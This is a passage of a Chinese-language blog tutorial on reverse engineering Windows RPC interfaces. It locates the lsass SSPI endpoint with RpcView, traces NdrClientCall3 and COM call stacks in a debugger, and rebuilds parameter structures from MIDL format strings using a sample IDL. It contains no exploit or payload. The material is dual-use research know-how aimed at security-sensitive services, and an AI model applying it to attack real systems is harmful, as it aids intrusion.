function_">SecpGetRpcBinding</span><span class="params">(RPC_BINDING_HANDLE *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  Binding = <span class="number">0</span>i64;</span><br><span class="line">  v2 = RpcStringBindingComposeW(</span><br><span class="line">         <span class="number">0</span>i64,</span><br><span class="line">         (RPC_WSTR)<span class="string">L&quot;ncalrpc&quot;</span>,</span><br><span class="line">         <span class="number">0</span>i64,</span><br><span class="line">         (RPC_WSTR)<span class="string">L&quot;lsasspirpc&quot;</span>,</span><br><span class="line">         word_180030B10,</span><br><span class="line">         &amp;StringBinding);</span><br><span class="line">  v2 = RpcBindingFromStringBindingW(StringBinding, &amp;Binding);<span class="comment">// 6. 可以看到, binding就是我们要找的rpc_binding_handle</span></span><br></pre></td></tr></table></figure><p>因为名字有isass, 估计是进程<code>isass.exe</code>, 通过<a href="https://www.rpcview.org/">rpcview</a>查看:</p><p><img src="/images/rpc_readme/1694059325724.png" alt="1694059325724"></p><p>rpcview不会自动识别端口来自哪个dll的rpc接口, 因此需要我们猜一下.</p><p>因为是sspi组件, 所以查看左下方所有的dll, 猜测应该是sspisrv.dll对应的服务是目标<code>lsasspirpc</code>, 右下方就是rpc的调用表.</p><p>rpcview的<code>Flags</code>栏, 鼠标放上去, 可以看到它的flag是什么意思.</p><p><img src="/images/rpc_readme/1721958980682.png" alt="1721958980682"></p><p>如果想有符号, 通过下列方式添加(目录不要包含空格):</p><p><img src="/images/rpc_readme/1694059416499.png" alt="1694059416499"></p><p><img src="/images/rpc_readme/1694059427500.png" alt="1694059427500"></p><p>类似于windbg. 添加后重启rpcview. </p><blockquote><p>它不会自动下载符号, 需要把符号先下载到对应目录才行, 下面是示例下载符号到<code>C:\symbols</code>目录的方法, 如果只需要一个dll的符号, 可以只下载那个dll, 不用全部下载.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd&gt; cd &quot;C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\&quot;</span><br><span class="line">cmd&gt; .\symchk /s srv*c:\SYMBOLS*https://msdl.microsoft.com/download/symbols C:\Windows\System32\*.dll</span><br></pre></td></tr></table></figure><p>另外, 在选中dll后, 点击右键, 选择<code>decompile</code>, 可以得到接口对应的idl.</p></blockquote><p>在sspisvc.dll里, 我们查找<code>RpcServerRegisterIf3</code>引用, 找到:</p><p><img src="/images/rpc_readme/1694059702812.png" alt="1694059702812"></p><p>跟踪<code>dword_180006380</code>:</p><p><img src="/images/rpc_readme/1694059793138.png" alt="1694059793138"></p><p>查看<code>[50h]</code>:</p><p><img src="/images/rpc_readme/1694060073435.png" alt="1694060073435"></p><p>查看<code>[8h]</code>:</p><p><img src="/images/rpc_readme/1694060911071.png" alt="1694060911071"></p><p>自此我们找到了它的调用接口.</p><p>一般rpc server的调用栈回溯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">SspiSrv!SspirProcessSecurityContext</span><br><span class="line">RPCRT4!Invoke+0x73</span><br><span class="line">RPCRT4!Ndr64StubWorker+0xb98</span><br><span class="line">RPCRT4!NdrServerCallAll+0x3c</span><br><span class="line">RPCRT4!DispatchToStubInCNoAvrf+0x17</span><br><span class="line">RPCRT4!RPC_INTERFACE::DispatchToStubWorker+0x1a8</span><br><span class="line">RPCRT4!RPC_INTERFACE::DispatchToStub+0xf1</span><br><span class="line">RPCRT4!LRPC_SCALL::DispatchRequest+0x14d</span><br><span class="line">RPCRT4!LRPC_SCALL::HandleRequest+0xd5a</span><br><span class="line">RPCRT4!LRPC_SASSOCIATION::HandleRequest+0x2c3</span><br><span class="line">RPCRT4!LRPC_ADDRESS::HandleRequest+0x183</span><br><span class="line">RPCRT4!LRPC_ADDRESS::ProcessIO+0x939</span><br><span class="line">RPCRT4!LrpcIoComplete+0xfe</span><br><span class="line">ntdll!TppAlpcpExecuteCallback+0x20c</span><br><span class="line">ntdll!TppWorkerThread+0x4b3</span><br><span class="line">KERNEL32!BaseThreadInitThunk+0x17</span><br><span class="line">ntdll!RtlUserThreadStart+0x20</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>方法2: 通过调试找到uuid</strong></p><p>在调用<code>NdrClientCall3</code>断下, 依次查看结构体:</p><p><img src="/images/rpc_readme/1694084123706.png" alt="1694084123706"></p><p>和rpcview一致.</p><h2 id="com接口的rpc-NdrpClientCall3"><a href="#com接口的rpc-NdrpClientCall3" class="headerlink" title="com接口的rpc NdrpClientCall3"></a>com接口的rpc NdrpClientCall3</h2><p>com接口一般在进程内调用rpc时就用的 <code>RPCRT4!NdrpClientCall3</code>接口. 声明如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">CLIENT_CALL_RETURN RPC_ENTRY</span><br><span class="line">NdrpClientCall3</span><br><span class="line">(</span><br><span class="line">void * pThis, // rcx</span><br><span class="line">MIDL_STUBLESS_PROXY_INFO *pProxyInfo, // rdx</span><br><span class="line">ulong nProcNum, // r8</span><br><span class="line">void *pReturnValue, // r9</span><br><span class="line">NDR_PROC_CONTEXT *pContext, // poi(@rsp+0x28)</span><br><span class="line">uchar *StartofStack // poi(@rsp+0x30)</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>第二个参数就是<code>MIDL_STUBLESS_PROXY_INFO </code>结构体指针, 第三个是函数序号. 如果确认是进程内的调用, 可以直接在当前线程的<code>RPCRT4!Invoke</code>下断点, 直接找到相关处理函数.</p><p>示例堆栈:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">07 00000053`8d2fd8e0 00007ffe`ef6d7de3     eapahost!EapHost::HostAuthenticatorApis::EapHostAuthenticatorReceivePacket+0xde // 实际调用的函数</span><br><span class="line"></span><br><span class="line">08 00000053`8d2fd960 00007ffe`ef73bc6d     RPCRT4!Invoke+0x73</span><br><span class="line">09 00000053`8d2fd9d0 00007ffe`ef6668b9     RPCRT4!Ndr64StubWorker+0xbfd</span><br><span class="line">0a 00000053`8d2fe0a0 00007ffe`ef802209     RPCRT4!NdrStubCall3+0xc9</span><br><span class="line">0b 00000053`8d2fe100 00007ffe`ef66a92b     combase!CStdStubBuffer_Invoke+0x59 [d:\rs1\onecore\com\combase\ndr\ndrole\stub.cxx @ 1527] </span><br><span class="line">0c 00000053`8d2fe140 00007ffe`ef84de3c     RPCRT4!CStdStubBuffer_Invoke+0x3b</span><br><span class="line">0d (Inline Function) --------`--------     combase!InvokeStubWithExceptionPolicyAndTracing::__l6::&lt;lambda_76d9e92c799d246a4afbe64a2bf5673d&gt;::operator()+0x24 [d:\rs1\onecore\com\combase\dcomrem\channelb.cxx @ 1824] </span><br><span class="line">0e 00000053`8d2fe170 00007ffe`ef84e482     combase!ObjectMethodExceptionHandlingAction&lt;&lt;lambda_76d9e92c799d246a4afbe64a2bf5673d&gt; &gt;+0x4c [d:\rs1\onecore\com\combase\dcomrem\excepn.hxx @ 91] </span><br><span class="line">0f (Inline Function) --------`--------     combase!InvokeStubWithExceptionPolicyAndTracing+0x8d [d:\rs1\onecore\com\combase\dcomrem\channelb.cxx @ 1822] </span><br><span class="line">10 00000053`8d2fe1d0 00007ffe`ef81fab1     combase!DefaultStubInvoke+0x222 [d:\rs1\onecore\com\combase\dcomrem\channelb.cxx @ 1891] </span><br><span class="line">11 00000053`8d2fe3f0 00007ffe`ef8054c0     combase!CCtxChnl::SendReceive+0x2b1 [d:\rs1\onecore\com\combase\dcomrem\crossctx.cxx @ 4138] </span><br><span class="line">12 00000053`8d2fe660 00007ffe`ef737aed     combase!NdrExtpProxySendReceive+0x1c0 [d:\rs1\onecore\com\combase\ndr\ndrole\proxy.cxx @ 1965] </span><br><span class="line">13 00000053`8d2fe6d0 00007ffe`ef8014f4     RPCRT4!NdrpClientCall3+0x46d</span><br><span class="line">14 00000053`8d2feae0 00007ffe`ef90cbb2     combase!ObjectStublessClient+0x144 [d:\rs1\onecore\com\combase\ndr\ndrole\amd64\stblsclt.cxx @ 371] </span><br><span class="line">15 00000053`8d2fee70 00007ffe`e27a4808     combase!ObjectStubless+0x42 [d:\rs1\onecore\com\combase\ndr\ndrole\amd64\stubless.asm @ 176] </span><br><span class="line"></span><br><span class="line">eapahost!ObjectStublessClient6(直接调用的 combase!ObjectStublessClient6)// 进入com接口调用</span><br><span class="line"></span><br><span class="line">16 00000053`8d2feec0 00007ffe`e27a25d9     iassam!EAPSession::processEAPPacket+0x64</span><br></pre></td></tr></table></figure><h2 id="RPC接口的序列化"><a href="#RPC接口的序列化" class="headerlink" title="RPC接口的序列化"></a>RPC接口的序列化</h2><p>当我们构造rpc的请求时, 需要知道server端需要什么样的参数, 如果是自定义的结构体, 如果rpcview无法解析出结构体, 就需要我们逆向server的结构体格式化描述, 逆向出结构体. 本节将介绍server端如何构造的结构体格式化描述, 通过ida比对, 来逆向server的结构体.</p><p>假如我们的idl定义如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    uuid(<span class="number">3</span>d267954-eeb7<span class="number">-11</span>d1-b94e<span class="number">-00</span>c04fa3080d),</span><br><span class="line">        version(<span class="number">1.0</span>),</span><br><span class="line">]</span><br><span class="line">interface Example1</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc0_TLSRpcGetVersion</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_1)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc1_TLSRpcConnect</span><span class="params">(</span></span><br><span class="line"><span class="params">        [out][context_handle] <span class="type">void</span>** arg_1)</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uknow1</span> &#123;</span></span><br><span class="line">        <span class="type">int</span> f1;</span><br><span class="line">        <span class="type">int</span> f2;</span><br><span class="line">        <span class="type">int</span> f3;</span><br><span class="line">        <span class="type">int</span> f4;</span><br><span class="line">        [size_is(f3)] <span class="type">unsigned</span> <span class="type">char</span>* buff;</span><br><span class="line">        <span class="type">int</span> f18;</span><br><span class="line">        <span class="type">int</span> f1c;</span><br><span class="line">        [size_is(f18)] <span class="type">unsigned</span> <span class="type">char</span>* buff2;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uknow2</span> &#123;</span></span><br><span class="line">        <span class="type">int</span> f1;</span><br><span class="line">        <span class="type">int</span> f2;</span><br><span class="line">        <span class="type">char</span>* buff;</span><br><span class="line">        <span class="type">int</span> f10;</span><br><span class="line">        <span class="type">int</span> f14;</span><br><span class="line">        <span class="type">int</span> f18;</span><br><span class="line">        <span class="type">int</span> f1c;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc44_TLSRpcChallengeServer</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [in]<span class="keyword">struct</span> uknow1* arg_2,</span></span><br><span class="line"><span class="params">        [out][ref]<span class="keyword">struct</span> uknow2** arg_3,</span></span><br><span class="line"><span class="params">        [out][ref]<span class="keyword">struct</span> uknow1** arg_4,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_5)</span>;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>在本文示例的server中, 添加如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">error_status_t</span> <span class="title function_">Proc0_TLSRpcGetVersion</span><span class="params">(<span class="type">void</span> *handle, <span class="type">long</span> *ver)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">error_status_t</span> <span class="title function_">Proc1_TLSRpcConnect</span><span class="params">(<span class="type">void</span>** handle)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">error_status_t</span> <span class="title function_">Proc44_TLSRpcChallengeServer</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">    <span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">    <span class="keyword">struct</span> uknow1* arg_2,</span></span><br><span class="line"><span class="params">    <span class="keyword">struct</span> uknow2** arg_3,</span></span><br><span class="line"><span class="params">    <span class="keyword">struct</span> uknow1** arg_4,</span></span><br><span class="line"><span class="params">    <span class="type">long</span>* arg_5)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里, 我们一共定义了三个接口函数. 并声明了两种特别的结构体<code>ukonw1</code>, <code>uknow2</code>.</p><p>在自动生成的.c文件里, 就可以看到如下信息:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> RPC_SERVER_INTERFACE Example1___RpcServerInterface =</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">sizeof</span>(RPC_SERVER_INTERFACE),</span><br><span class="line">    &#123;&#123;<span class="number">0x3d267954</span>,<span class="number">0xeeb7</span>,<span class="number">0x11d1</span>,&#123;<span class="number">0xb9</span>,<span class="number">0x4e</span>,<span class="number">0x00</span>,<span class="number">0xc0</span>,<span class="number">0x4f</span>,<span class="number">0xa3</span>,<span class="number">0x08</span>,<span class="number">0x0d</span>&#125;&#125;,&#123;<span class="number">1</span>,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">    &#123;&#123;<span class="number">0x8A885D04</span>,<span class="number">0x1CEB</span>,<span class="number">0x11C9</span>,&#123;<span class="number">0x9F</span>,<span class="number">0xE8</span>,<span class="number">0x08</span>,<span class="number">0x00</span>,<span class="number">0x2B</span>,<span class="number">0x10</span>,<span class="number">0x48</span>,<span class="number">0x60</span>&#125;&#125;,&#123;<span class="number">2</span>,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">    (RPC_DISPATCH_TABLE*)&amp;Example1_v1_0_DispatchTable,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    &amp;Example1_ServerInfo,</span><br><span class="line">    <span class="number">0x06000000</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> MIDL_SERVER_INFO Example1_ServerInfo = </span><br><span class="line">    &#123;</span><br><span class="line">    &amp;Example1_StubDesc,</span><br><span class="line">    Example1_ServerRoutineTable,</span><br><span class="line">    Example1__MIDL_ProcFormatString.Format,</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">short</span> *) Example1_FormatStringOffsetTable,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    (RPC_SYNTAX_IDENTIFIER*)&amp;_NDR64_RpcTransferSyntax_1_0,</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    (MIDL_SYNTAX_INFO*)Example1_SyntaxInfo</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> MIDL_SYNTAX_INFO Example1_SyntaxInfo [  <span class="number">2</span> ] = </span><br><span class="line">    &#123;</span><br><span class="line">    &#123;</span><br><span class="line">    &#123;&#123;<span class="number">0x8A885D04</span>,<span class="number">0x1CEB</span>,<span class="number">0x11C9</span>,&#123;<span class="number">0x9F</span>,<span class="number">0xE8</span>,<span class="number">0x08</span>,<span class="number">0x00</span>,<span class="number">0x2B</span>,<span class="number">0x10</span>,<span class="number">0x48</span>,<span class="number">0x60</span>&#125;&#125;,&#123;<span class="number">2</span>,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">    (RPC_DISPATCH_TABLE*)&amp;Example1_v1_0_DispatchTable,</span><br><span class="line">    Example1__MIDL_ProcFormatString.Format,</span><br><span class="line">    Example1_FormatStringOffsetTable,</span><br><span class="line">    Example1__MIDL_TypeFormatString.Format,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    ,&#123;</span><br><span class="line">    &#123;&#123;<span class="number">0x71710533</span>,<span class="number">0xbeba</span>,<span class="number">0x4937</span>,&#123;<span class="number">0x83</span>,<span class="number">0x19</span>,<span class="number">0xb5</span>,<span class="number">0xdb</span>,<span class="number">0xef</span>,<span class="number">0x9c</span>,<span class="number">0xcc</span>,<span class="number">0x36</span>&#125;&#125;,&#123;<span class="number">1</span>,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">    (RPC_DISPATCH_TABLE*)&amp;Example1_NDR64__v1_0_DispatchTable,</span><br><span class="line">    <span class="number">0</span> ,</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">short</span> *) Example1_Ndr64ProcTable,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中序列化有关的就是 <code>Example1_SyntaxInfo</code>结构体.</p><p>在ida中如下:</p><p><img src="/images/rpc_readme/1722224226542.png" alt="1722224226542"></p><p>以下是<code>Example1__MIDL_ProcFormatString</code>结构体的部分内容:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> Example1_MIDL_PROC_FORMAT_STRING Example1__MIDL_ProcFormatString =</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        &#123;</span><br><span class="line">      ......</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Procedure Proc44_TLSRpcChallengeServer */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 88 */</span><span class="number">0x0</span>,<span class="comment">/* 0 */</span></span><br><span class="line"><span class="number">0x48</span>,<span class="comment">/* Old Flags:  */</span></span><br><span class="line"><span class="comment">/* 90 */</span>NdrFcLong( <span class="number">0x0</span> ),<span class="comment">/* 0 */</span></span><br><span class="line"><span class="comment">/* 94 */</span>NdrFcShort( <span class="number">0x2</span> ),<span class="comment">/* 2 */</span></span><br><span class="line"><span class="comment">/* 96 */</span>NdrFcShort( <span class="number">0x38</span> ),<span class="comment">/* X64 Stack size/offset = 56 */</span></span><br><span class="line"><span class="comment">/* 98 */</span><span class="number">0x30</span>,<span class="comment">/* FC_BIND_CONTEXT */</span></span><br><span class="line"><span class="number">0x40</span>,<span class="comment">/* Ctxt flags:  in, */</span></span><br><span class="line"><span class="comment">/* 100 */</span>NdrFcShort( <span class="number">0x0</span> ),<span class="comment">/* X64 Stack size/offset = 0 */</span></span><br><span class="line"><span class="comment">/* 102 */</span><span class="number">0x0</span>,<span class="comment">/* 0 */</span></span><br><span class="line"><span class="number">0x0</span>,<span class="comment">/* 0 */</span></span><br><span class="line"><span class="comment">/* 104 */</span>NdrFcShort( <span class="number">0x48</span> ),<span class="comment">/* 72 */</span></span><br><span class="line"><span class="comment">/* 106 */</span>NdrFcShort( <span class="number">0x24</span> ),<span class="comment">/* 36 */</span></span><br><span class="line"><span class="comment">/* 108 */</span><span class="number">0x47</span>,<span class="comment">/* Oi2 Flags:  srv must size, clt must size, has return, has ext, */</span></span><br><span class="line"><span class="number">0x7</span>,<span class="comment">/* 7 */</span></span><br><span class="line"><span class="comment">/* 110 */</span><span class="number">0xa</span>,<span class="comment">/* 10 */</span></span><br><span class="line"><span class="number">0x7</span>,<span class="comment">/* Ext Flags:  new corr desc, clt corr check, srv corr check, */</span></span><br><span class="line"><span class="comment">/* 112 */</span>NdrFcShort( <span class="number">0x1</span> ),<span class="comment">/* 1 */</span></span><br><span class="line"><span class="comment">/* 114 */</span>NdrFcShort( <span class="number">0x1</span> ),<span class="comment">/* 1 */</span></span><br><span class="line"><span class="comment">/* 116 */</span>NdrFcShort( <span class="number">0x0</span> ),<span class="comment">/* 0 */</span></span><br><span class="line"><span class="comment">/* 118 */</span>NdrFcShort( <span class="number">0x0</span> ),<span class="comment">/* 0 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Parameter arg_0 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 120 */</span>NdrFcShort( <span class="number">0x8</span> ),<span class="comment">/* Flags:  in, */</span></span><br><span class="line"><span class="comment">/* 122 */</span>NdrFcShort( <span class="number">0x0</span> ),<span class="comment">/* X64 Stack size/offset = 0 */</span></span><br><span class="line"><span class="comment">/* 124 */</span>NdrFcShort( <span class="number">0x2</span> ),<span class="comment">/* Type Offset=2 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Parameter arg_1 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 126 */</span>NdrFcShort( <span class="number">0x48</span> ),<span class="comment">/* Flags:  in, base type, */</span></span><br><span class="line"><span class="comment">/* 128 */</span>NdrFcShort( <span class="number">0x8</span> ),<span class="comment">/* X64 Stack size/offset = 8 */</span></span><br><span class="line"><span class="comment">/* 130 */</span><span class="number">0x8</span>,<span class="comment">/* FC_LONG */</span></span><br><span class="line"><span class="number">0x0</span>,<span class="comment">/* 0 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Parameter arg_2 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 132 */</span>NdrFcShort( <span class="number">0x10b</span> ),<span class="comment">/* Flags:  must size, must free, in, simple ref, */</span></span><br><span class="line"><span class="comment">/* 134 */</span>NdrFcShort( <span class="number">0x10</span> ),<span class="comment">/* X64 Stack size/offset = 16 */</span></span><br><span class="line"><span class="comment">/* 136 */</span>NdrFcShort( <span class="number">0x2e</span> ),<span class="comment">/* Type Offset=46 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Parameter arg_3 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 138 */</span>NdrFcShort( <span class="number">0x2013</span> ),<span class="comment">/* Flags:  must size, must free, out, srv alloc size=8 */</span></span><br><span class="line"><span class="comment">/* 140 */</span>NdrFcShort( <span class="number">0x18</span> ),<span class="comment">/* X64 Stack size/offset = 24 */</span></span><br><span class="line"><span class="comment">/* 142 */</span>NdrFcShort( <span class="number">0x48</span> ),<span class="comment">/* Type Offset=72 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Parameter arg_4 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 144 */</span>NdrFcShort( <span class="number">0x2013</span> ),<span class="comment">/* Flags:  must size, must free, out, srv alloc size=8 */</span></span><br><span class="line"><span class="comment">/* 146 */</span>NdrFcShort( <span class="number">0x20</span> ),<span class="comment">/* X64 Stack size/offset = 32 */</span></span><br><span class="line"><span class="comment">/* 148 */</span>NdrFcShort( <span class="number">0x64</span> ),<span class="comment">/* Type Offset=100 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Parameter arg_5 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 150 */</span>NdrFcShort( <span class="number">0x158</span> ),<span class="comment">/* Flags:  in, out, base type, simple ref, */</span></span><br><span class="line"><span class="comment">/* 152 */</span>NdrFcShort( <span class="number">0x28</span> ),<span class="comment">/* X64 Stack size/offset = 40 */</span></span><br><span class="line"><span class="comment">/* 154 */</span><span class="number">0x8</span>,<span class="comment">/* FC_LONG */</span></span><br><span class="line"><span class="number">0x0</span>,<span class="comment">/* 0 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Return value */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 156 */</span>NdrFcShort( <span class="number">0x70</span> ),<span class="comment">/* Flags:  out, return, base type, */</span></span><br><span class="line"><span class="comment">/* 158 */</span>NdrFcShort( <span class="number">0x30</span> ),<span class="comment">/* X64 Stack size/offset = 48 */</span></span><br><span class="line"><span class="comment">/* 160 */</span><span class="number">0x10</span>,<span class="comment">/* FC_ERROR_STATUS_T */</span></span><br><span class="line"><span 